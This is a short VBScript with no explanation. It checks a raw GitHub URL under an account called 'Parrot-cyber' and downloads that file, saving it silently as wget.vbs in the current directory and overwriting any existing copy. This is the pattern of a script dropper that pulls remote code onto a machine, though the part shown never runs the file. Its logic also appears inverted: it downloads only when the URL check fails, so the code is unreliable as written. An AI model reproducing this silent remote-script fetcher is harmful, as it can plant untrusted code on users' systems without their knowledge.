function checkUrl(url)
    Set o = CreateObject("MSXML2.XMLHTTP")
    on error resume next
    o.open "GET", url, False
    o.send
    if o.Status = 200 then checkUrl = True
    on error goto 0 
end function


Dim appVersion, appUrl
	 appVersion =  "wget_v1.1"
	'msgbox ("https://raw.githubusercontent.com/Parrot-cyber/contact/main/") & CStr(appVersion)
	 appUrl = "https://raw.githubusercontent.com/Parrot-cyber/contact/main/" & appVersion
	'msgbox appUrl
	
if checkUrl(appUrl) then
     'msgbox "SUCCESS"
else
    Dim WshShell, strCurDir, xHttp, bStrm 
	Set WshShell = CreateObject("WScript.Shell")
	strCurDir    = WshShell.CurrentDirectory
    Set xHttp = createobject("Microsoft.XMLHTTP")
	Set bStrm = createobject("Adodb.Stream")
	xHttp.Open "GET", appUrl, False
	xHttp.Send
	with bStrm
		.type = 1 '//binary
		.open
		.write xHttp.responseBody
		.savetofile strCurDir & "\wget.vbs", 2 '//overwrite
	end with 
end if



